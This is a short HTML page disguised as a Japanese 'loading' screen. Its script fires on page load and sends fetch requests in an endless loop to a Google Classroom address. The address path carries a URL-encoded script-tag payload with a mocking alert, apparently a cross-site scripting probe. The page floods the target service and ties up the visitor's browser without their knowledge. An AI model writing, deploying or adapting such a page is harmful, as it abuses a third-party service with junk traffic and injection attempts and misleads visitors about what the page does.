<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>読み込み中</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: sans-serif;
            font-size: 24px;
            color: #333;
            background-color: #ffffff;
            user-select: none;
        }
    </style>
</head>
<body>

    <div>読み込み中...</div>

<script>
  const targetUrl = 'https://classroom.google.com/%3Cscript%3Ealert%28%22you+are+an+idiot%21+hahaha%21%22%29%3C%2Fscript%3E';

    async function autoFetch() {
        try {
	    while (true){
		await fetch(targetUrl, {
                    method: 'GET', 
                    mode: 'cors'
		});
	    }
        } catch (error) {
            console.error('Fetch error:', error);
        }
    }

    document.addEventListener('DOMContentLoaded', autoFetch);
</script>

</body>
</html>
